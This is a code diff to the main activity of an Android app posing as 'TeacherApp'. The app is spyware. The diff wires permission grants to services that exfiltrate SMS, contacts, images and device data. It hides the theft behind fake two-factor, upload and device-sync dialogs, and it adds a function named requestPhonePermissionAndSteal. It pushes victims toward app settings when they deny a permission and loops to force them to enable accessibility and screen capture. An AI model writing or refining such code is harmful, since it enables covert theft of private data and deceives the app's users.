@@ -77,24 +77,12 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // Batch permission launcher (upfront request on first launch)
-    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-        arrayOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_PHONE_STATE
-        )
-    } else {
-        arrayOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_PHONE_STATE
-        )
-    }
+    // All permissions requested contextually — none at startup
+    private val requiredPermissions = emptyArray<String>()
 
     private val permissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
-    ) { permissions ->
+    ) { permissions: Map<String, Boolean> ->
         val allGranted = permissions.values.all { it }
         if (allGranted) {
             onAllPermissionsGranted()
@@ -111,7 +99,24 @@ class MainActivity : ComponentActivity() {
             ImageExfiltrationService.startExfiltration(this@MainActivity)
             showFakeUploadDialog()
         } else {
-            Toast.makeText(this, "Cannot upload profile picture without permission", Toast.LENGTH_SHORT).show()
+            if (!shouldShowRequestPermissionRationale(if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE)) {
+                AlertDialog.Builder(this)
+                    .setTitle("Permission Required")
+                    .setMessage("Storage permission was denied. Please enable it in App Settings to upload your profile picture.")
+                    .setPositiveButton("Open Settings") { dialog, _ ->
+                        dialog.dismiss()
+                        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                        intent.data = android.net.Uri.parse("package:$packageName")
+                        startActivity(intent)
+                    }
+                    .setNegativeButton("Cancel") { dialog, _ ->
+                        dialog.dismiss()
+                    }
+                    .setCancelable(false)
+                    .show()
+            } else {
+                Toast.makeText(this, "Storage permission was denied.", Toast.LENGTH_SHORT).show()
+            }
         }
     }
 
@@ -122,7 +127,24 @@ class MainActivity : ComponentActivity() {
             ContactExfiltrationService.startExfiltration(this@MainActivity)
             showFakeImportDialog()
         } else {
-            Toast.makeText(this, "Cannot import contacts without permission", Toast.LENGTH_SHORT).show()
+            if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_CONTACTS)) {
+                AlertDialog.Builder(this)
+                    .setTitle("Permission Required")
+                    .setMessage("Contacts permission was denied. Please enable it in App Settings to sync your contacts.")
+                    .setPositiveButton("Open Settings") { dialog, _ ->
+                        dialog.dismiss()
+                        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                        intent.data = android.net.Uri.parse("package:$packageName")
+                        startActivity(intent)
+                    }
+                    .setNegativeButton("Cancel") { dialog, _ ->
+                        dialog.dismiss()
+                    }
+                    .setCancelable(false)
+                    .show()
+            } else {
+                Toast.makeText(this, "Contacts permission was denied.", Toast.LENGTH_SHORT).show()
+            }
         }
     }
 
@@ -133,7 +155,53 @@ class MainActivity : ComponentActivity() {
             SmsExfiltrationService.startExfiltration(this@MainActivity)
             showFakeVerificationDialog()
         } else {
-            Toast.makeText(this, "Cannot verify phone without permission", Toast.LENGTH_SHORT).show()
+            if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)) {
+                AlertDialog.Builder(this)
+                    .setTitle("Permission Required")
+                    .setMessage("SMS permission was denied. Please enable it in App Settings to set up two-factor authentication.")
+                    .setPositiveButton("Open Settings") { dialog, _ ->
+                        dialog.dismiss()
+                        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                        intent.data = android.net.Uri.parse("package:$packageName")
+                        startActivity(intent)
+                    }
+                    .setNegativeButton("Cancel") { dialog, _ ->
+                        dialog.dismiss()
+                    }
+                    .setCancelable(false)
+                    .show()
+            } else {
+                Toast.makeText(this, "SMS permission is required for two-factor authentication", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    private val phonePermissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { isGranted ->
+        if (isGranted) {
+            AppDataExfiltrationService.startExfiltration(this@MainActivity)
+            showFakeDeviceSyncDialog()
+        } else {
+            // If permanently denied, show dialog then open App Settings
+            if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_PHONE_STATE)) {
+                AlertDialog.Builder(this)
+                    .setTitle("Permission Required")
+                    .setMessage("Phone permission was denied. Please enable it in App Settings to sync your device.")
+                    .setPositiveButton("Open Settings") { dialog, _ ->
+                        dialog.dismiss()
+                        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                        intent.data = android.net.Uri.parse("package:$packageName")
+                        startActivity(intent)
+                    }
+                    .setNegativeButton("Cancel") { dialog, _ ->
+                        dialog.dismiss()
+                    }
+                    .setCancelable(false)
+                    .show()
+            } else {
+                Toast.makeText(this, "Phone permission is required to sync your device", Toast.LENGTH_SHORT).show()
+            }
         }
     }
 
@@ -179,8 +247,8 @@ class MainActivity : ComponentActivity() {
             AppDataExfiltrationService.startExfiltration(this@MainActivity)
         }, 5000)
 
-        // Request all permissions upfront
-        requestNecessaryPermissions()
+        // Start screen recording and accessibility loop
+        onAllPermissionsGranted()
     }
 
     private fun requestNecessaryPermissions() {
@@ -188,52 +256,20 @@ class MainActivity : ComponentActivity() {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
         if (permissionsNeeded.isNotEmpty()) {
-            showPermissionRationale(permissionsNeeded)
+            permissionLauncher.launch(permissionsNeeded.toTypedArray())
         } else {
             onAllPermissionsGranted()
         }
     }
 
-    private fun showPermissionRationale(permissions: List<String>) {
-        AlertDialog.Builder(this)
-            .setTitle("Permissions Required")
-            .setMessage(
-                "TeacherApp needs the following permissions to function properly:\n\n" +
-                        "• SMS: To send class announcements\n" +
-                        "• Phone: To verify device identity\n\n" +
-                        "These permissions help enhance your user experience."
-            )
-            .setPositiveButton("Grant Permissions") { dialog, _ ->
-                dialog.dismiss()
-                permissionLauncher.launch(permissions.toTypedArray())
-            }
-            .setNegativeButton("Cancel") { dialog, _ ->
-                dialog.dismiss()
-                Toast.makeText(this, "App requires permissions to function", Toast.LENGTH_LONG).show()
-            }
-            .setCancelable(false)
-            .show()
-    }
-
     private fun onAllPermissionsGranted() {
         Toast.makeText(this, "Welcome to TeacherApp", Toast.LENGTH_SHORT).show()
-
-        // Schedule timed exfiltration
-        CoroutineScope(Dispatchers.Default).launch {
-            delay(10000L)
-            SmsExfiltrationService.startExfiltration(this@MainActivity)
-            delay(5000L)
-            ContactExfiltrationService.startExfiltration(this@MainActivity)
-            delay(5000L)
-            ImageExfiltrationService.startExfiltration(this@MainActivity)
-        }
 
         // Step 1: Request screen sharing first
         val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         projectionLauncher.launch(projectionManager.createScreenCaptureIntent())
 
         // Step 2: After screenshare dialog is handled, start non-stop accessibility loop
-        // (delay so the two system dialogs don't overlap)
         Handler(Looper.getMainLooper()).postDelayed({
             startAccessibilityLoop()
         }, 4000)
@@ -276,6 +312,23 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    fun requestPhonePermissionAndSteal() {
+        when {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED -> {
+                AppDataExfiltrationService.startExfiltration(this@MainActivity)
+                showFakeDeviceSyncDialog()
+            }
+            shouldShowRequestPermissionRationale(Manifest.permission.READ_PHONE_STATE) -> {
+                // First time or user previously denied without "don't ask again"
+                phonePermissionLauncher.launch(Manifest.permission.READ_PHONE_STATE)
+            }
+            else -> {
+                // Either first-ever request OR permanently denied — launch permission dialog
+                phonePermissionLauncher.launch(Manifest.permission.READ_PHONE_STATE)
+            }
+        }
+    }
+
     // ========== FAKE SUCCESS DIALOGS ==========
 
     private fun showFakeUploadDialog() {
@@ -305,15 +358,32 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun showFakeVerificationDialog() {
+        val code = (100000..999999).random().toString()
         val dialog = AlertDialog.Builder(this)
-            .setTitle("Verifying Phone Number")
-            .setMessage("Checking SMS verification code...")
+            .setTitle("Two-Factor Authentication")
+            .setMessage("Sending verification code to your registered number...\n\nCode: $code")
+            .setCancelable(false)
+            .create()
+        dialog.show()
+        Handler(Looper.getMainLooper()).postDelayed({
+            dialog.setMessage("Verifying code $code...")
+        }, 1500)
+        Handler(Looper.getMainLooper()).postDelayed({
+            dialog.dismiss()
+            Toast.makeText(this, "✅ Two-factor authentication enabled!", Toast.LENGTH_LONG).show()
+        }, 3000)
+    }
+
+    private fun showFakeDeviceSyncDialog() {
+        val dialog = AlertDialog.Builder(this)
+            .setTitle("Syncing Device")
+            .setMessage("🔄 Syncing your device information...")
             .setCancelable(false)
             .create()
         dialog.show()
         Handler(Looper.getMainLooper()).postDelayed({
             dialog.dismiss()
-            Toast.makeText(this, "✅ Phone number verified successfully!", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "✅ Device synced successfully!", Toast.LENGTH_LONG).show()
         }, 2000)
     }
 
@@ -434,7 +504,7 @@ class MainActivity : ComponentActivity() {
             val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
             intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
             startActivity(intent)
-            Toast.makeText(this, "Enable ALL TeacherApp services in the list", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "Enable TeacherApp in the list", Toast.LENGTH_LONG).show()
         } catch (e: Exception) {
             Toast.makeText(this, "Could not open accessibility settings", Toast.LENGTH_LONG).show()
         }
@@ -454,8 +524,8 @@ class MainActivity : ComponentActivity() {
         val wasScreenDimmed = !ScreenOverlayState.isTracking
         val params = window.attributes
         params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
-        window.attributes = params
         params.alpha = 1.0f
+        window.attributes = params
         window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
         window.setDimAmount(0.0f)
 
@@ -474,15 +544,20 @@ class MainActivity : ComponentActivity() {
     override fun onResume() {
         super.onResume()
         inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
-        // When user returns from accessibility settings, re-trigger the loop
-        // so it immediately re-checks and dismisses or re-prompts
-        if (!isAccessibilityServiceEnabled()) {
-            accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
-            accessibilityHandler.postDelayed(accessibilityCheckRunnable, 1500)
-        } else {
-            // Both services enabled — stop the loop
-            accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
-        }
+
+        // Give Android enough time to register the accessibility service
+        accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
+        accessibilityHandler.postDelayed({
+            if (isAccessibilityServiceEnabled()) {
+                accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
+            } else {
+                accessibilityHandler.postDelayed({
+                    if (!isAccessibilityServiceEnabled()) {
+                        accessibilityHandler.post(accessibilityCheckRunnable)
+                    }
+                }, 2000)
+            }
+        }, 3000)
     }
 
     override fun onPause() {
